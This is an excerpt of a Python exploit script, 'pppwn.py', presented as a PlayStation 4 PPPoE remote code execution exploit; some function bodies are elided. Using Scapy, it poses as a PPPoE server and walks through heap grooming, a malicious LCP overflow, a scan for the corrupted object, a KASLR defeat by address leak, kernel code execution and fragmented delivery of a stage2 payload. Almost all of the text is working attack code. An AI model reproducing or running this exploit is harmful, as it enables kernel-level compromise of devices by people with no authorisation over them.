...
class Exploit:
	...
	def lcp_negotiation(self):
		print('[*] Sending LCP configure request...');self.s.send(Ether(src=self.source_mac,dst=self.target_mac,type=ETHERTYPE_PPPOE)/PPPoE(sessionid=self.SESSION_ID)/PPP()/PPP_LCP(code=CONF_REQ,id=self.LCP_ID));print('[*] Waiting for LCP configure ACK...')
		while True:
			pkt=self.s.recv()
		...
		print('[*] Sending LCP configure ACK...');self.s.send(Ether(src=self.source_mac,dst=self.target_mac,type=ETHERTYPE_PPPOE)/PPPoE(sessionid=self.SESSION_ID)/PPP()/PPP_LCP(code=CONF_ACK,id=pkt[PPP_LCP_Configure].id))
	def ipcp_negotiation(self):
		print('[*] Sending IPCP configure request...');self.s.send(Ether(src=self.source_mac,dst=self.target_mac,type=ETHERTYPE_PPPOE)/PPPoE(sessionid=self.SESSION_ID)/PPP()/PPP_IPCP(code=CONF_REQ,id=self.IPCP_ID,options=PPP_IPCP_Option_IPAddress(data=self.SOURCE_IPV4)));print('[*] Waiting for IPCP configure ACK...')
		while True:
			pkt=self.s.recv()
		...
		print('[*] Sending IPCP configure NAK...');self.s.send(Ether(src=self.source_mac,dst=self.target_mac,type=ETHERTYPE_PPPOE)/PPPoE(sessionid=self.SESSION_ID)/PPP()/PPP_IPCP(code=CONF_NAK,id=pkt[PPP_IPCP].id,options=PPP_IPCP_Option_IPAddress(data=self.TARGET_IPV4)));print('[*] Waiting for IPCP configure request...')
		while True:
			pkt=self.s.recv()
			if pkt and pkt.haslayer(PPP_IPCP)and pkt[PPP_IPCP].code==CONF_REQ:break
		print('[*] Sending IPCP configure ACK...');self.s.send(Ether(src=self.source_mac,dst=self.target_mac,type=ETHERTYPE_PPPOE)/PPPoE(sessionid=self.SESSION_ID)/PPP()/PPP_IPCP(code=CONF_ACK,id=pkt[PPP_IPCP].id,options=pkt[PPP_IPCP].options))
	def ppp_negotation(self,cb=None,ignore_initial_req=False):
		...
		self.pppoe_softc=unpack('<Q',host_uniq)[0];print('[+] pppoe_softc: {}'.format(hex(self.pppoe_softc)));self.target_mac=pkt[Ether].src;print('[+] Target MAC: {}'.format(self.target_mac));self.source_mac=self.SOURCE_MAC
		if cb:ac_cookie=cb()
		else:ac_cookie=b''
		print('[+] AC cookie length: {}'.format(hex(len(ac_cookie))));print('[*] Sending PADO...');self.s.send(Ether(src=self.source_mac,dst=self.target_mac,type=ETHERTYPE_PPPOEDISC)/PPPoED(code=PPPOE_CODE_PADO)/PPPoETag(tag_type=PPPOE_TAG_ACOOKIE,tag_value=ac_cookie)/PPPoETag(tag_type=PPPOE_TAG_HUNIQUE,tag_value=host_uniq));print('[*] Waiting for PADR...')
		while True:
			pkt=self.s.recv()
			if pkt and pkt.haslayer(PPPoED)and pkt[PPPoED].code==PPPOE_CODE_PADR:break
		print('[*] Sending PADS...');self.s.send(Ether(src=self.source_mac,dst=self.target_mac,type=ETHERTYPE_PPPOEDISC)/PPPoED(code=PPPOE_CODE_PADS,sessionid=self.SESSION_ID)/PPPoETag(tag_type=PPPOE_TAG_HUNIQUE,tag_value=host_uniq))
	def build_fake_ifnet(self):planted=self.pppoe_softc+7&0xffffffffffff;self.source_mac=str2mac(planted.to_bytes(6,byteorder='little'));print('[+] Source MAC: {}'.format(self.source_mac));fake_ifnet=bytearray();fake_ifnet+=b'A'*(72-len(fake_ifnet));fake_ifnet+=p64(NULL);fake_ifnet+=b'A'*(112-len(fake_ifnet));fake_ifnet+=p16(1);fake_ifnet+=b'A'*(160-len(fake_ifnet));fake_ifnet+=p8(IFT_ETHER);fake_ifnet+=p8(0);fake_ifnet+=p8(8+1);fake_ifnet+=b'A'*(440-len(fake_ifnet));fake_ifnet+=p64(self.pppoe_softc+PPPOE_SOFTC_SC_DEST);fake_ifnet+=b'A'*(1064-len(fake_ifnet));fake_ifnet+=p64(self.pppoe_softc+16-8);fake_ifnet+=b'A'*(1152-len(fake_ifnet));fake_ifnet+=p64(NULL);fake_ifnet+=p32(RW_INIT_FLAGS);fake_ifnet+=p32(0);fake_ifnet+=p64(NULL);fake_ifnet+=p64(RW_UNLOCKED);fake_ifnet+=b'A'*(1216-len(fake_ifnet));fake_ifnet+=p64(NULL);fake_ifnet+=p32(MTX_INIT_FLAGS);fake_ifnet+=p32(0);fake_ifnet+=p64(NULL);fake_ifnet+=p64(MTX_UNOWNED);return fake_ifnet
	...
	def run(self):
		lcp_echo_handler=LcpEchoHandler(self.iface);lcp_echo_handler.start();print('');print('[+] STAGE 0: Initialization');self.ppp_negotation(self.build_fake_ifnet,True);self.lcp_negotiation();self.ipcp_negotiation();print('[*] Waiting for interface to be ready...')
		while True:
			pkt=self.s.recv()
			if pkt and pkt.haslayer(ICMPv6ND_RS):break
		self.target_ipv6=pkt[IPv6].src;print('[+] Target IPv6: {}'.format(self.target_ipv6))
		for i in range(self.SPRAY_NUM):
			if i%256==0:print('[*] Heap grooming...{}%'.format(100*i//self.SPRAY_NUM),end='\r',flush=True)
		...
		print('[+] Heap grooming...done');print('');print('[+] STAGE 1: Memory corruption')
		for i in range(self.PIN_NUM):
			if i%256==0:print('[*] Pinning to CPU 0...{}%'.format(100*i//self.PIN_NUM),end='\r',flush=True)
			self.s.send(Ether(src=self.source_mac,dst=self.target_mac,type=ETHERTYPE_PPPOE));sleep(.001)
		print('[+] Pinning to CPU 0...done');sleep(1);overflow_lle=self.build_overflow_lle();print('[*] Sending malicious LCP configure request...')
		...
		for i in reversed(range(self.SPRAY_NUM)):
			if i%256==0:print('[*] Scanning for corrupted object...{}'.format(hex(i)),end='\r',flush=True)
			if i>=self.HOLE_START and i%self.HOLE_SPACE==0:continue
			source_ipv6='fe80::{:04x}:4141:4141:4141'.format(i);self.s.send(Ether(src=self.source_mac,dst=self.target_mac)/IPv6(src=source_ipv6,dst=self.target_ipv6)/ICMPv6EchoRequest())
			while True:
				pkt=self.s.recv()
			...
			if corrupted:break
			self.s.send(Ether(src=self.source_mac,dst=self.target_mac)/IPv6(src=source_ipv6,dst=self.target_ipv6)/ICMPv6ND_NA(tgt=source_ipv6,S=1)/ICMPv6NDOptDstLLAddr(lladdr=self.source_mac))
		if not corrupted:print('[-] Scanning for corrupted object...failed. Please retry.');exit(1)
		print('[+] Scanning for corrupted object...found {}'.format(source_ipv6));print('');print('[+] STAGE 2: KASLR defeat');print('[*] Defeating KASLR...')
		while True:
			pkt=self.s.recv()
		...
		if self.pppoe_softc_list&0xffffffff00000fff!=self.offs.PPPOE_SOFTC_LIST&0xffffffff00000fff:print('[-] Error leak is invalid. Wrong firmware?');exit(1)
		print('');print('[+] STAGE 3: Remote code execution');print('[*] Sending LCP terminate request...');self.s.send(Ether(src=self.source_mac,dst=self.target_mac,type=ETHERTYPE_PPPOE)/PPPoE(sessionid=self.SESSION_ID)/PPP()/PPP_LCP_Terminate());self.ppp_negotation(self.build_fake_lle);print('[*] Triggering code execution...');self.s.send(Ether(src=self.source_mac,dst=self.target_mac)/IPv6(src=self.SOURCE_IPV6,dst=self.target_ipv6)/ICMPv6EchoRequest());print('[*] Waiting for stage1 to resume...');count=0
		while count<3:
			pkt=self.s.recv()
			if pkt and pkt.haslayer(PPP_LCP_Configure)and pkt[PPP_LCP_Configure].code==CONF_REQ:count+=1
		print('[*] Sending PADT...');self.s.send(Ether(src=self.source_mac,dst=self.target_mac,type=ETHERTYPE_PPPOEDISC)/PPPoED(code=PPPOE_CODE_PADT,sessionid=self.SESSION_ID));self.ppp_negotation();self.lcp_negotiation();self.ipcp_negotiation();print('');print('[+] STAGE 4: Arbitrary payload execution');print('[*] Sending stage2 payload...');frags=fragment(IP(src=self.SOURCE_IPV4,dst=self.TARGET_IPV4)/UDP(dport=self.STAGE2_PORT)/self.stage2,1024)
		for frag in frags:self.s.send(Ether(src=self.source_mac,dst=self.target_mac)/frag)
		print('[+] Done!')
def main():
	parser=ArgumentParser('pppwn.py');parser.add_argument('--interface',required=True);parser.add_argument('--fw',default='1100');parser.add_argument('--stage1',default='/root/PPPwn/stage1.bin');parser.add_argument('--stage2',default='/root/PPPwn/stage2.bin');args=parser.parse_args();print('[+] PPPwn - PlayStation 4 PPPoE RCE by theflow');print('[+] args: '+' '.join(f"{k}={v}"for(k,v)in vars(args).items()))
